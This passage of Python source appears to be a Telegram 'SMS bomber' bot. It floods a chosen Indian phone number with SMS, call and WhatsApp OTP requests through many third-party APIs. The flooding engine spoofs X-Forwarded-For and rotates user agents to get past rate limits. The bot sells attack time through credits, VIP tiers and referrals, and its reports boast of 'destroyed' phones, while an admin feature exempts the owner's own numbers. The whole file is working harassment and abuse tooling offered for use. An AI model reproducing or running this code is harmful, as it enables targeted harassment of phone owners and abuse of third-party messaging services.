        async with self._lock:
            self.active_jobs[job_id] = True

        stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "calls": 0,
            "whatsapp": 0,
            "sms": 0,
            "apis_hit": set()
        }

        async with self._lock:
            self.bomb_stats[job_id] = stats

        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                async with self._lock:
                    if not self.active_jobs.get(job_id, False):
                        break
                task = asyncio.create_task(self._send_request(session, api, phone, job_id))
                tasks.append(task)

            end_time = time.time() + duration
            while time.time() < end_time:
                async with self._lock:
                    if not self.active_jobs.get(job_id, False):
                        break
                await asyncio.sleep(1)

            for task in tasks:
                if not task.done():
                    task.cancel()

        async with self._lock:
            self.active_jobs[job_id] = False

        return self.bomb_stats.get(job_id, stats)

    async def _send_request(self, session, api, phone, job_id):
        """Send a single bombing request"""
        while True:
            async with self._lock:
                if not self.active_jobs.get(job_id, False):
                    break

            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()

                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
                ])

                stats = self.bomb_stats.get(job_id)
                if stats:
                    stats["total"] += 1

                    if "call" in name.lower() or "voice" in name.lower():
                        stats["calls"] += 1
                    elif "whatsapp" in name.lower():
                        stats["whatsapp"] += 1
                    else:
                        stats["sms"] += 1

                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            if stats:
                                stats["success"] += 1
                                stats["apis_hit"].add(name)
                        else:
                            if stats:
                                stats["failed"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            if stats:
                                stats["success"] += 1
                                stats["apis_hit"].add(name)
                        else:
                            if stats:
                                stats["failed"] += 1

                await asyncio.sleep(random.uniform(0.001, 0.02))

            except Exception:
                stats = self.bomb_stats.get(job_id)
                if stats:
                    stats["failed"] += 1
                continue

    def stop_job(self, job_id):
        """Stop a bombing job"""
        if job_id in self.active_jobs:
            self.active_jobs[job_id] = False
            return True
        return False

# ============= BOMBER INSTANCE =============
bomber = TelegramBomber()

# ============= TELEGRAM BOT HANDLERS =============

def get_branding():
    """Get bot branding text with animated emojis"""
    return e(f"""
╔══════════════════════════════════════╗
║    💀 {BOT_NAME} {VERSION} 💀    ║
║        Bot by @{BOT_OWNER}          ║
║      Made by Naruto ⚡           ║
╚══════════════════════════════════════╝
""")

def get_user_info(user_id, username="Unknown"):
    """Get user info with credits"""
    user = db.get_user(user_id)
    credits = user[2] if user else 0
    total_bombs = user[3] if user else 0
    total_success = user[4] if user else 0
    is_vip = user[6] if user else 0
    referral_count = user[8] if user else 0

    return {
        "credits": credits,
        "total_bombs": total_bombs,
        "total_success": total_success,
        "is_vip": is_vip,
        "referral_count": referral_count
    }

def get_main_keyboard():
    """Get main menu keyboard"""
    keyboard = [
        [InlineKeyboardButton("💥 Bomb Now", callback_data="bomb")],
        [InlineKeyboardButton("💰 Credits", callback_data="credits")],
        [InlineKeyboardButton("👑 VIP", callback_data="vip")],
        [InlineKeyboardButton("👥 Referral", callback_data="refer")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("🏆 Top Users", callback_data="top")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(back_callback="main"):
    """Get back button keyboard"""
    keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data=back_callback)]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"

    user = db.get_user(user_id)
    db.update_profile(user_id, username, first_name)

    # Check if referred
    if context.args and context.args[0].isdigit():
        referrer_id = int(context.args[0])
        if referrer_id != user_id:
            db.cursor.execute('SELECT * FROM referrals WHERE referee_id = ?', (user_id,))
            if not db.cursor.fetchone():
                db.cursor.execute('''
                    INSERT INTO referrals (referrer_id, referee_id, timestamp)
                    VALUES (?, ?, ?)
                ''', (referrer_id, user_id, datetime.now().isoformat()))
                db.add_credits(referrer_id, REFERRAL_BONUS, f"Referral bonus from {username}")
                db.cursor.execute('''
                    UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?
                ''', (referrer_id,))
                db.conn.commit()

                await update.message.reply_text(
                    e(f"🎉 <b>Referral Successful!</b>\n\n"
                      f"@{username} has been referred by you.\n"
                      f"You received +{REFERRAL_BONUS} credits!"),
                    parse_mode="HTML"
                )

    user_info = get_user_info(user_id, username)

    welcome_text = e(f"""
{get_branding()}
👋 <b>Welcome, @{username}!</b>

📊 <b>Your Stats:</b>
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
👥 Referrals: {user_info['referral_count']}

⚡ <b>Commands:</b>
/bomb &lt;number&gt; [duration] - Bomb a number
/credits - Check your credits
/buy - How to get more credits
/refer - Get your referral link
/stats - Bot statistics
/top - Top users leaderboard
/help - Show all commands

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
""")

    await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")

# ============= CALLBACK HANDLERS =============

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks with back navigation"""
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    data = query.data
    user_info = get_user_info(user_id, username)
    is_vip = bool(user_info['is_vip'])

    # MAIN MENU
    if data == "main":
        text = e(f"""
{get_branding()}
👋 <b>Welcome back, @{username}!</b>

📊 <b>Your Stats:</b>
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👑 VIP: {'✅ Yes' if is_vip else '❌ No'}
👥 Referrals: {user_info['referral_count']}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
""")
        await query.edit_message_text(text, reply_markup=get_main_keyboard(), parse_mode="HTML")

    # BOMB MENU — VIP-GATED PRESETS
    elif data == "bomb":
        if is_vip:
            preset_row = [
                InlineKeyboardButton("⚡ 30s", callback_data="bomb_30"),
                InlineKeyboardButton("🔥 60s", callback_data="bomb_60"),
                InlineKeyboardButton("💀 120s", callback_data="bomb_120"),
            ]
            duration_block = e(
                "🎯 <b>Quick Actions (VIP):</b>\n"
                "• 30s — Fast attack\n"
                "• 60s — Standard attack\n"
                "• 120s — Maximum damage\n"
                "👑 VIP: no duration cap."
            )
        else:
            preset_row = [
                InlineKeyboardButton("⚡ 30s", callback_data="bomb_30"),
                InlineKeyboardButton("⏰ 45s", callback_data="bomb_45"),
                InlineKeyboardButton("🔒 60s", callback_data="bomb_locked"),
            ]
            duration_block = e(
                f"🎯 <b>Quick Actions (Free):</b>\n"
                f"• 30s — Fast attack\n"
                f"• 45s — Max for free users\n"
                f"🔒 60s+ — VIP only\n\n"
                f"⚠️ <b>Free users capped at {MAX_DURATION_FREE}s.</b>\n"
                f"👑 Get VIP for unlimited duration."
            )

        await query.edit_message_text(
            e(f"""
💥 <b>Bomb Control Center</b>

📱 <b>Send a 10-digit phone number to start bombing.</b>
Use: /bomb 9876543210 {MAX_DURATION_FREE if not is_vip else 120}

💰 <b>Cost:</b> {BOMB_COST} credit per attack
👑 <b>VIP:</b> FREE unlimited bombing + unlimited duration!

{duration_block}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=InlineKeyboardMarkup([
                preset_row,
                [InlineKeyboardButton("⬅️ Back", callback_data="main")]
            ]),
            parse_mode="HTML"
        )

    # CREDITS MENU
    elif data == "credits":
        await query.edit_message_text(
            e(f"""
💰 <b>Your Credits</b>

👤 User: @{username}
👑 VIP: {'✅ Yes' if is_vip else '❌ No'}
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👥 Referrals: {user_info['referral_count']}

📊 <b>Credit Usage:</b>
- Bomb cost: {BOMB_COST} credit per attack
- Max free duration: {MAX_DURATION_FREE}s
- Referral bonus: +{REFERRAL_BONUS} credits
- Free credits on join: +{DEFAULT_CREDITS} credits

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Get More Credits", callback_data="buy")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main")]
            ]),
            parse_mode="HTML"
        )

    # VIP MENU
    elif data == "vip":
        await query.edit_message_text(
            e(f"""
👑 <b>VIP Membership</b>

✨ <b>VIP Benefits:</b>
- 🚀 Unlimited bombing duration ({MAX_DURATION_VIP}s cap)
- 💰 No credit costs
- 🔥 Priority support
- 🎁 Exclusive features
- 👑 Special VIP badge

🆚 <b>Free vs VIP:</b>
- Free: max {MAX_DURATION_FREE}s per attack, {BOMB_COST} credit each
- VIP: unlimited duration, no credits needed

💰 <b>Price:</b> Contact @{BOT_OWNER}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )

    # REFERRAL MENU
    elif data == "refer":
        referral_link = f"https://t.me/{(await context.bot.get_me()).username}?start={user_id}"
        await query.edit_message_text(
            e(f"""
👥 <b>Referral Program</b>

📤 <b>Your Referral Link:</b>
<code>{referral_link}</code>

📊 <b>Your Referrals: {user_info['referral_count']}</b>
💰 Bonus per referral: +{REFERRAL_BONUS} credits

🎯 <b>How it works:</b>
1. Share your link with friends
2. They join using your link
3. You get +{REFERRAL_BONUS} credits
4. They get {DEFAULT_CREDITS} free credits!

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )

    # BUY
    elif data == "buy":
        await query.edit_message_text(
            e(f"""
💳 <b>Get More Credits</b>

🎁 <b>Free Methods:</b>
1️⃣ Use /refer - Share your referral link
2️⃣ Get +{REFERRAL_BONUS} credits per referral
3️⃣ Join our channel for free credits

👑 <b>VIP Membership:</b>
- Unlimited bombing duration
- No credit costs
- Priority support
- Exclusive features

📞 <b>Contact Admin:</b> DM @{BOT_OWNER} for VIP access

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("credits"),
            parse_mode="HTML"
        )

    # STATS
    elif data == "stats":
        stats = db.get_stats()
        await query.edit_message_text(
            e(f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {stats['total_users']}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=get_back_keyboard("main"),
            parse_mode="HTML"
        )

    # TOP USERS
    elif data == "top":
        top_users = db.get_top_users(10)
        if not top_users:
            text = e("❌ No users yet!")
        else:
            text = e("🏆 <b>Top Users Leaderboard</b>\n\n")
            for i, user in enumerate(top_users, 1):
                uid_db, uname_db, fname_db, credits, _, _ = user
                medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
                text += e(f"{medal} ") + display_name(uid_db, uname_db, fname_db) + e(f" - {credits} credits 💰\n")
        text += e(f"\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")
        await query.edit_message_text(text, reply_markup=get_back_keyboard("main"), parse_mode="HTML")

    # QUICK BOMB PRESETS — VIP GATE ENFORCED
    elif data.startswith("bomb_"):
        if data == "bomb_locked":
            await query.edit_message_text(
                e(f"""
🔒 <b>VIP Only Preset</b>

⏰ This duration is locked for free users.
📱 Free users are capped at <b>{MAX_DURATION_FREE}s</b>.

👑 Get VIP for unlimited bombing duration.
📞 Contact @{BOT_OWNER}
"""),
                reply_markup=get_back_keyboard("bomb"),
                parse_mode="HTML"
            )
            return

        try:
            duration = int(data.split("_")[1])
        except (ValueError, IndexError):
            return

        # HARD GATE — non-VIP can't pick anything above the free cap
        if not is_vip and duration > MAX_DURATION_FREE:
            await query.edit_message_text(
                e(f"""
🔒 <b>VIP Only</b>

⏰ Requested: {duration}s
🚫 Free users max: {MAX_DURATION_FREE}s

👑 Upgrade to VIP for unlimited duration.
📞 Contact @{BOT_OWNER}
"""),
                reply_markup=get_back_keyboard("bomb"),
                parse_mode="HTML"
            )
            return

        await query.edit_message_text(
            e(f"📱 <b>Quick Bomb Setup</b>\n\n"
              f"⏰ Duration: {duration} seconds\n"
              f"💰 Cost: {BOMB_COST} credit\n"
              f"👑 VIP: {'✅ Unlimited' if is_vip else f'❌ Free tier ({MAX_DURATION_FREE}s cap)'}\n\n"
              f"Type: <code>/bomb &lt;10-digit number&gt; {duration}</code>\n"
              f"Example: <code>/bomb 9876543210 {duration}</code>\n\n"
              f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
            reply_markup=get_back_keyboard("bomb"),
            parse_mode="HTML"
        )

# ============= COMMAND HANDLERS =============

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command with VIP duration gate"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"

    user_info = get_user_info(user_id, username)

    args = context.args
    if not args:
        await update.message.reply_text(
            e(f"❌ <b>Usage:</b> /bomb &lt;10-digit phone number&gt; [duration]\n"
              f"Example: /bomb 9876543210 {MAX_DURATION_FREE}\n\n"
              f"💰 Cost: {BOMB_COST} credit per bomb\n"
              f"⏰ Free cap: {MAX_DURATION_FREE}s | 👑 VIP: unlimited\n"
              f"FREE for VIP users!"),
            parse_mode="HTML"
        )
        return

    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return

    # ===== PROTECTED NUMBER CHECK =====
    protected = db.is_number_protected(phone)
    if protected:
        owner_id, label = protected
        await update.message.reply_text(
            e(f"🔥 <b>PROTECTED NUMBER!</b>\n\n"
              f"📱 {phone} is registered as <b>{label}</b>'s personal number.\n"
              f"💀 <b>Acha lode baap ko seekhayega</b>\n\n"
              f"🛡️ This number is under Shadow's protection.\n"
              f"👑 Try again with a different target."),
            parse_mode="HTML"
        )
        print(f"⚠️ BLOCKED: User {user_id} tried to bomb protected number {phone} (Owner: {label})")
        return

    # ===== DURATION PARSE =====
    duration = DEFAULT_DURATION
    if len(args) > 1 and args[1].isdigit():
        duration = int(args[1])

    # sanity floor
    if duration < 1:
        duration = DEFAULT_DURATION

    # ===== VIP DURATION GATE (HARD) =====
    if not user_info['is_vip']:
        if duration > MAX_DURATION_FREE:
            await update.message.reply_text(
                e(f"🔒 <b>VIP Only Duration</b>\n\n"
                  f"⏰ Requested: {duration}s\n"
                  f"🚫 Free users max: <b>{MAX_DURATION_FREE}s</b>\n\n"
                  f"👑 Get VIP for unlimited bombing duration.\n"
                  f"📞 Contact @{BOT_OWNER}\n\n"
                  f"💡 Try: <code>/bomb {phone} {MAX_DURATION_FREE}</code>"),
                parse_mode="HTML"
            )
            return
    else:
        # VIP sanity cap
        if duration > MAX_DURATION_VIP:
            duration = MAX_DURATION_VIP

    # ===== CREDITS GATE (non-VIP only) =====
    if not user_info['is_vip']:
        if user_info['credits'] < BOMB_COST:
            await update.message.reply_text(
                e(f"❌ <b>Insufficient Credits!</b>\n\n"
                  f"You need {BOMB_COST} credit to bomb.\n"
                  f"Your balance: {user_info['credits']} credits\n\n"
                  f"Use /buy to get more credits or /refer to earn free credits!"),
                parse_mode="HTML"
            )
            return

        if not db.remove_credits(user_id, BOMB_COST, f"Bombing +91{phone}"):
            await update.message.reply_text(e("❌ Failed to deduct credits. Please try again."), parse_mode="HTML")
            return

    remaining = user_info['credits'] - BOMB_COST
    vip_line = "👑 VIP Mode: Unlimited Power!" if user_info['is_vip'] else f"💰 Credits Remaining: {remaining}"
    status_msg = await update.message.reply_text(
        e(f"🚀 <b>Starting bombardment on +91{phone}</b>\n"
          f"⏰ Duration: {duration} seconds\n"
          f"💣 APIs: {len(ULTIMATE_APIS)} loaded\n"
          f"{vip_line}\n"
          f"🔄 Please wait...\n\n"
          f"💀 <b>Bot by @{BOT_OWNER}</b>"),
        parse_mode="HTML"
    )

    job_id = f"{phone}_{int(time.time())}"
    context.bot_data[job_id] = {
        "phone": phone,
        "duration": duration,
        "start_time": time.time(),
        "status_msg": status_msg,
        "stats": None
    }

    asyncio.create_task(run_bombing_job(context, job_id, phone, duration, user_id))

async def run_bombing_job(context, job_id, phone, duration, user_id):
    """Run bombing job"""
    stats = await bomber.bomb_phone(phone, duration)

    if job_id in context.bot_data:
        context.bot_data[job_id]["stats"] = stats

        user = db.get_user(user_id)
        db.cursor.execute('''
            UPDATE users
            SET total_bombs = total_bombs + 1,
                total_success = total_success + ?
            WHERE user_id = ?
        ''', (stats['success'], user_id))
        db.conn.commit()

        status_msg = context.bot_data[job_id]["status_msg"]
        elapsed = time.time() - context.bot_data[job_id]["start_time"]

        report = e(f"""
✅ <b>Bombing Complete!</b>

📱 Target: +91{phone}
⏰ Duration: {elapsed:.1f}s
💥 Total Attacks: {stats['total']}
✅ Success: {stats['success']}
❌ Failed: {stats['failed']}
📞 Calls Sent: {stats['calls']}
📱 WhatsApp: {stats['whatsapp']}
💬 SMS Sent: {stats['sms']}
🎯 Unique APIs: {len(stats['apis_hit'])}
""")

        if stats['success'] > 2000:
            report += e("\n☠️ <b>PHONE COMPLETELY DESTROYED!</b>")
        elif stats['success'] > 1000:
            report += e("\n🔥 <b>PHONE HANGED SUCCESSFULLY!</b>")
        elif stats['success'] > 500:
            report += e("\n⚡ <b>Phone severely damaged!</b>")
        elif stats['success'] > 100:
            report += e("\n🎯 <b>Bombing successful!</b>")
        else:
            report += e("\n⚠️ <b>Limited damage inflicted.</b>")

        report += e(f"\n\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")

        try:
            await status_msg.edit_text(report, parse_mode="HTML")
        except Exception:
            pass

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check credits"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"
    db.update_profile(user_id, username, first_name)

    user_info = get_user_info(user_id, username)

    await update.message.reply_text(
        e(f"""
💰 <b>Your Credits</b>

👤 User: @{username}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👥 Referrals: {user_info['referral_count']}

📊 <b>Credit Usage:</b>
- Bomb cost: {BOMB_COST} credit per attack
- Max free duration: {MAX_DURATION_FREE}s
- Referral bonus: +{REFERRAL_BONUS} credits
- Free credits on join: +{DEFAULT_CREDITS} credits

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """How to get more credits"""
    await update.message.reply_text(
        e(f"""
💳 <b>Get More Credits</b>

🎁 <b>Free Methods:</b>
1️⃣ Use /refer - Share your referral link
2️⃣ Get +{REFERRAL_BONUS} credits per referral
3️⃣ Join our channel for free credits

👑 <b>VIP Membership:</b>
- Unlimited bombing duration
- No credit costs
- Priority support
- Exclusive features

📞 <b>Contact Admin:</b> DM @{BOT_OWNER} for VIP access

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get referral link"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"
    db.update_profile(user_id, username, first_name)

    user_info = get_user_info(user_id, username)
    referral_link = f"https://t.me/{(await context.bot.get_me()).username}?start={user_id}"

    await update.message.reply_text(
        e(f"""
👥 <b>Referral Program</b>

📤 <b>Your Referral Link:</b>
<code>{referral_link}</code>

📊 <b>Your Referrals: {user_info['referral_count']}</b>
💰 Bonus per referral: +{REFERRAL_BONUS} credits

🎯 <b>How it works:</b>
1. Share your link with friends
2. They join using your link
3. You get +{REFERRAL_BONUS} credits
4. They get {DEFAULT_CREDITS} free credits!

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot stats"""
    stats = db.get_stats()

    await update.message.reply_text(
        e(f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {stats['total_users']}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def top_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show top users"""
    top_users = db.get_top_users(10)

    if not top_users:
        await update.message.reply_text(e("❌ No users yet!"), parse_mode="HTML")
        return

    text = e("🏆 <b>Top Users Leaderboard</b>\n\n")
    for i, user in enumerate(top_users, 1):
        uid_db, uname_db, fname_db, credits, _, _ = user
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        text += e(f"{medal} ") + display_name(uid_db, uname_db, fname_db) + e(f" - {credits} credits 💰\n")

    text += e(f"\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")

    await update.message.reply_text(text, parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all commands"""
    await update.message.reply_text(
        e(f"""
📖 <b>Available Commands</b>

✅ <b>User Commands:</b>
/start - Welcome message
/bomb &lt;number&gt; [duration] - Bomb a number (max {MAX_DURATION_FREE}s for free users)
/credits - Check your credits
/buy - Get more credits
/refer - Get referral link
/stats - Bot statistics
/top - Top users leaderboard
/help - This message

⏰ <b>Duration Limits:</b>
- Free users: max {MAX_DURATION_FREE}s per attack
- VIP users: unlimited (up to {MAX_DURATION_VIP}s)

👑 <b>Admin Commands:</b>
/addcredits &lt;user_id&gt; &lt;amount&gt; - Add credits
/removecredits &lt;user_id&gt; &lt;amount&gt; - Remove credits
/addvip &lt;user_id&gt; - Make user VIP
/removevip &lt;user_id&gt; - Remove VIP status
/giveall &lt;amount&gt; - Give credits to all users
/broadcast &lt;message&gt; - Broadcast message
/users - Show all users
/adminstats - Advanced admin stats
/protect &lt;number&gt; [label] - Protect a number from bombing
/unprotect &lt;number&gt; - Remove protection from a number
/protected - List all protected numbers

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

# ============= ADMIN COMMANDS =============

async def admin_check(update: Update):
    """Check if user is admin"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(e("❌ You are not authorized to use this command."), parse_mode="HTML")
        return False
    return True

async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add credits to a user"""
    if not await admin_check(update):
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(e("❌ Usage: /addcredits &lt;user_id&gt; &lt;amount&gt;"), parse_mode="HTML")
        return

    try:
        user_id = int(args[0])
        amount = int(args[1])
        db.add_credits(user_id, amount, f"Admin added by {update.effective_user.id}")
        await update.message.reply_text(e(f"✅ Added {amount} credits to user {user_id}"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID or amount."), parse_mode="HTML")

async def removecredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove credits from a user"""
    if not await admin_check(update):
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(e("❌ Usage: /removecredits &lt;user_id&gt; &lt;amount&gt;"), parse_mode="HTML")
        return

    try:
        user_id = int(args[0])
        amount = int(args[1])
        if db.remove_credits(user_id, amount, f"Admin removed by {update.effective_user.id}"):
            await update.message.reply_text(e(f"✅ Removed {amount} credits from user {user_id}"), parse_mode="HTML")
        else:
            await update.message.reply_text(e(f"❌ Insufficient credits for user {user_id}"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID or amount."), parse_mode="HTML")

async def addvip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Make a user VIP"""
    if not await admin_check(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /addvip &lt;user_id&gt;"), parse_mode="HTML")
        return

    try:
        user_id = int(args[0])
        db.cursor.execute('UPDATE users SET is_vip = 1 WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ User {user_id} is now VIP! 👑"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID."), parse_mode="HTML")

async def removevip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove VIP status"""
    if not await admin_check(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /removevip &lt;user_id&gt;"), parse_mode="HTML")
        return

    try:
        user_id = int(args[0])
        db.cursor.execute('UPDATE users SET is_vip = 0 WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ User {user_id} is no longer VIP."), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid user ID."), parse_mode="HTML")

async def giveall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Give credits to all users"""
    if not await admin_check(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(e("❌ Usage: /giveall &lt;amount&gt;"), parse_mode="HTML")
        return

    try:
        amount = int(args[0])
        db.cursor.execute('UPDATE users SET credits = credits + ?', (amount,))
        db.conn.commit()
        await update.message.reply_text(e(f"✅ Added {amount} credits to ALL users! 🎁"), parse_mode="HTML")
    except ValueError:
        await update.message.reply_text(e("❌ Invalid amount."), parse_mode="HTML")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast a message to all users"""
    if not await admin_check(update):
        return

    message = ' '.join(context.args)
    if not message:
        await update.message.reply_text(e("❌ Usage: /broadcast &lt;message&gt;"), parse_mode="HTML")
        return

    db.cursor.execute('SELECT user_id FROM users')
    users = db.cursor.fetchall()

    sent = 0
    for user in users:
        try:
            await context.bot.send_message(
                user[0],
                e(f"📢 <b>Broadcast:</b>\n\n{message}\n\n💀 Bot by @{BOT_OWNER}"),
                parse_mode="HTML"
            )
            sent += 1
            await asyncio.sleep(0.1)
        except Exception:
            continue

    await update.message.reply_text(e(f"✅ Broadcast sent to {sent} users. 📨"), parse_mode="HTML")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all users"""
    if not await admin_check(update):
        return

    db.cursor.execute('SELECT COUNT(*) FROM users')
    total = db.cursor.fetchone()[0]

    db.cursor.execute('SELECT user_id, username, first_name, credits, is_vip FROM users ORDER BY credits DESC LIMIT 50')
    users = db.cursor.fetchall()

    text = e(f"👥 <b>Users ({total} total)</b>\n\n")
    for user in users:
        uid_u, uname_u, fname_u, credits, is_vip = user
        vip = e("👑") if is_vip else ""
        text += f"{vip} {display_name(uid_u, uname_u, fname_u)} - {credits} credits\n"

    await update.message.reply_text(text, parse_mode="HTML")

async def adminstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Advanced admin stats"""
    if not await admin_check(update):
        return

    stats = db.get_stats()

    db.cursor.execute('SELECT SUM(credits) FROM users')
    total_credits = db.cursor.fetchone()[0] or 0

    db.cursor.execute('SELECT COUNT(*) FROM users WHERE is_vip = 1')
    vip_count = db.cursor.fetchone()[0]

    db.cursor.execute('SELECT COUNT(*) FROM users WHERE credits > 100')
    rich_users = db.cursor.fetchone()[0]

    await update.message.reply_text(
        e(f"""
📊 <b>Admin Statistics</b>

👥 Total Users: {stats['total_users']}
💰 Total Credits: {total_credits}
👑 VIP Users: {vip_count}
💎 Rich Users (100+ credits): {rich_users}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

📊 <b>Average per user:</b>
Credits: {total_credits // stats['total_users'] if stats['total_users'] > 0 else 0}
Bombs: {stats['total_bombs'] // stats['total_users'] if stats['total_users'] > 0 else 0}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

# ============= PROTECTED NUMBER COMMANDS =============

async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner-only: Add a protected number"""
    if not await admin_check(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            e("❌ Usage: /protect &lt;10-digit number&gt; [label]\n"
              "Example: /protect 9876543210 Naruto\n\n"
              "📱 This number will be shielded from bombing."),
            parse_mode="HTML"
        )
        return

    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return

    label = "Owner"
    if len(args) > 1:
        label = ' '.join(args[1:])

    db.add_protected_number(update.effective_user.id, phone, label)
